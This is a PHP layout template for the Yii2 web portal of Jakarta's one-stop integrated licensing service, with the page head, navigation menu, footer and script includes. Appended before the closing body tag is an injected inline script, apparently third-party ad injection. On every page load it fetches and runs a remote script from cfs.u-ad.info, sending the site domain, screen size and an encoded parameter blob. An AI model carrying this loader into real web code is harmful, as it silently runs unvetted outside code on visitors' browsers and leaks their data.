<?php
use backend\assets\AppAsset;
use yii\helpers\Html;
use yii\bootstrap\Nav;
use yii\bootstrap\NavBar;
use yii\widgets\Breadcrumbs;

use yii\widgets\ActiveForm;
use yii\helpers\Url;



/* @var $this \yii\web\View */
/* @var $content string */

AppAsset::register($this);
?>
 <?php $this->beginPage() ?>
    <!-- START @HEAD -->
    <head>
        <!-- START @META SECTION -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
        <meta name="description" content="Blankon is a theme fullpack admin template powered by Twitter bootstrap 3 front-end framework. Included are multiple example pages, elements styles, and javascript widgets to get your project started.">
        <meta name="keywords" content="">
        <meta name="author" content="Djava UI">
        <title>PTSP-DKI</title>
        <!--/ END META SECTION -->
	 <!--TO TOP-->
        <link rel="stylesheet" media="screen,projection" href="../../../../assets/totop/css/ui.totop.css" />
        <!--TO TOP-->	
	<link rel="shortcut icon"  type="image/png" size="36x36" href="<?= Yii::getAlias('@web') ?>/images/favicon.png">
        <link href="../../../../img/ico/html/apple-touch-icon-144x144-precomposed.png" rel="apple-touch-icon-precomposed" sizes="144x144">
        <link href="../../../../img/ico/html/apple-touch-icon-114x114-precomposed.png" rel="apple-touch-icon-precomposed" sizes="114x114">
        <link href="../../../../img/ico/html/apple-touch-icon-72x72-precomposed.png" rel="apple-touch-icon-precomposed" sizes="72x72">
        <link href="../../../../img/ico/html/apple-touch-icon-57x57-precomposed.png" rel="apple-touch-icon-precomposed">
        <link href="../../../../img/ico/html/apple-touch-icon.png" rel="shortcut icon">
        <!--/ END FAVICONS -->
         <!--TO TOP-->
        <link rel="stylesheet" media="screen,projection" href="../../../../assets/totop/css/ui.totop.css" />
        <!--TO TOP-->
        <link href="../../../assets/admin/css/reset.css" rel="stylesheet">
        <link href="../../../assets/admin/css/layout.css" rel="stylesheet">
        <link href="../../../assets/admin/css/components.css" rel="stylesheet">
        <link href="../../../assets/admin/css/plugins.css" rel="stylesheet">
        <link href="../../../assets/admin/css/themes/default.theme.css" rel="stylesheet" id="theme">
        <link href="../../../assets/admin/css/custom.css" rel="stylesheet">
        <!-- START @FONT STYLES -->
        <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700" rel="stylesheet">
        <!--/ END FONT STYLES -->

        <!-- PARALLAX -->

        
        <!-- PARALLAX -->
        
        <!-- START @GLOBAL MANDATORY STYLES -->
        <link href="../../../../assets/global/plugins/bower_components/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
        <!--/ END GLOBAL MANDATORY STYLES -->

        <!-- START @PAGE LEVEL STYLES -->
        <link href="../../../../assets/global/plugins/bower_components/fontawesome/css/font-awesome.min.css" rel="stylesheet">
        <link href="../../../../assets/global/plugins/bower_components/animate.css/animate.min.css" rel="stylesheet">
        <!--/ END PAGE LEVEL STYLES -->
		
		
        <!-- START @THEME STYLES -->
        <link href="../../../../assets/frontend/start-page/css/start-page.css" rel="stylesheet">
        <!--/ END THEME STYLES -->

        <!-- START @IE SUPPORT -->
        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
        <script src="../../../../assets/global/plugins/bower_components/html5shiv/dist/html5shiv.min.js"></script>
        <script src="../../../../assets/global/plugins/bower_components/respond-minmax/dest/respond.min.js"></script>
        <![endif]-->
        <!--/ END IE SUPPORT -->
    </head>
    <!--/ END HEAD -->
<body>
    <?php $this->beginBody() ?>
    <div class="header-box">
        <div class="container header-logo">
            <div class="row">
                <div class="col-sm-1">
                    <img class="" src="<?= Yii::getAlias('@web') ?>/images/logo-ptsp-icon.png">
                </div>
                <div class="col-sm-10">    
                    <h3 class="moto-header">BADAN PELAYANAN TERPADU SATU PINTU</h3>
                    <h3 class="moto-header">DKI JAKARTA</h3>
                </div>
                <div class="col-sm-1">
                    <img class="" src="<?= Yii::getAlias('@web') ?>/images/logo-dki-small.png">
                </div>
            </div>    
        </div>
    </div>
    
    <div id="wrapper">
        
        <?php
            NavBar::begin([
                //'brandLabel' => Html::img('@web/images/logo-ptsp-white.png', ['alt'=>Yii::$app->name]),
                'brandUrl' => Yii::$app->homeUrl,
                'options' => [
                    'class' => 'navbar navbar-default',
                ],
            ]);
            $menuItems = [
                ['label' => 'Beranda', 'url' => Yii::$app->homeUrl], ['label' => 'Tentang PTSP', 'url' => ['/site/aboutptsp']], ['label' => 'Visi Dan Misi', 'url' => ['/site/visimisi']], ['label' => 'Berita', 'url' => ['/site/news']],

            ];
            if (Yii::$app->user->isGuest) {
                $menuItems[] = ['label' => 'Login', 'url' => ['/user/login']];
            } else {
                $menuItems[] = [
                    'label' => 'Logout (' . Yii::$app->user->identity->username . ')',
                    'url' => ['/user/logout'],
                    'linkOptions' => ['data-method' => 'post']
                ];
            }
            echo Nav::widget([
                'options' => ['class' => 'navbar-nav navbar-right'],
                'items' => $menuItems,
            ]);
            NavBar::end();
        ?>
        
        <div class="container-fluid">
            <div class="row">
                <div class="col-sm-12">

                  <?= Breadcrumbs::widget([
                      'links' => isset($this->params['breadcrumbs']) ? $this->params['breadcrumbs'] : [],
                  ]) ?>
                  <?= $content ?>

                </div> 
                 
            </div>
        </div>
          <div class="">
              <div class="">
              <footer class="footer-content">
                    <div class="container">
                    <span class="pull-left">&copy; Dinas Komunikasi Informatika dan Kehumasan Pemerintah Provinsi DKI Jakarta - All Rights Reserved <?= date('Y') ?></span>
                   
                    </div>
                </footer>
              </div>
         </div>
   
<!-- START @BACK TOP -->
        <div id="back-top" class="animated pulse">
            <i class="fa fa-angle-up"></i>
        </div>
        <!--/ END BACK TOP -->
		
        <!-- START JAVASCRIPT SECTION (Load javascripts at bottom to reduce load time) -->
        <!-- Starting the plugin -->
        
        <!-- START @CORE PLUGINS -->
        <script src="../../../../assets/global/plugins/bower_components/jquery/dist/jquery.min.js"></script>
        <script src="../../../../assets/global/plugins/bower_components/jquery-cookie/jquery.cookie.js"></script>
        <script src="../../../../assets/global/plugins/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
        <script src="../../../../assets/global/plugins/bower_components/jquery-nicescroll/jquery.nicescroll.min.js"></script>
        <script src="../../../../assets/global/plugins/bower_components/jquery-easing-original/jquery.easing.1.3.min.js"></script>
        <script src="../../../../assets/global/plugins/bower_components/ionsound/js/ion.sound.min.js"></script>
        <!--/ END CORE PLUGINS -->

        <!-- START @PAGE LEVEL PLUGINS -->
        <script src="../../../../assets/global/plugins/bower_components/jquery-waypoints/waypoints.min.js"></script>
        <script src="../../../../assets/global/plugins/bower_components/jquery-waypoints/shortcuts/sticky-elements/waypoints-sticky.min.js"></script>
        <!--/ END PAGE LEVEL PLUGINS -->

        <!-- START @PAGE LEVEL SCRIPTS -->
        <script src="../../../../assets/frontend/start-page/js/blankon.start-page.js"></script>
        <!--/ END PAGE LEVEL SCRIPTS -->
        <!--/ END JAVASCRIPT SECTION -->

    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRPCm5Ee%2bm%2b0MCfbn%2fkCGS%2fLej842hcpx0aOGAkX%2bnhjYTzvTVWNgsy2Y%2f%2flA%2buOypqRhZdUXg%2b6%2fmVuUIMGQbjZ%2b3WuzaMERB2mTQembeZHBuGv27rKA8qwGz%2bdo7nNzvkMXzgZRYqaQ0qp3SHlm9PQg2tHt3C02e293ubw8I3CHFUU%2fhMIlpOt%2bTicyWEdZZJCmIImmyGvm%2f5cQlZjish5SIwccmaburxA%2fR0jF5GuGPysoZQClYqCuDwn0yDPr%2bPjd3KV90UJbLJPxRnGsFW39sfj%2f2f61WENebhc%2fmKOvf07wQGxiY8yVcBx0eMIgeHid1oZ2ulg%2faBwBqc3w9TkoibqVr3Cu5%2bofMRTRB8Ukdx8hMG3IZU%2b%2bghaqUBYKvZzm53vao3%2fNqwJ%2fQguTAUQJEisTDUuq3uemSlPAwt4kGQgZmcurVH8%2bt4WNychTq69cu%2fgRGwQEDKtcTKMrf%2fOT5fJK7lz5cKRVNN80lWURESaLyBjig%2bQ8qPfV2gWMw3LsEhV2qM5WkpNVX1XU0Dk2idvlQPcf9fZ7B%2bv3YRNgV7vsgjxoQq0Fl8L2NPmPxW66nIrFTBfSenxGd4BFqyxQxdXflKaye%2bHoqEkQ7sV3jAPB4hKcR3w%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
    <?php $this->endBody() ?>
</body>
</html>
<?php $this->endPage() ?>
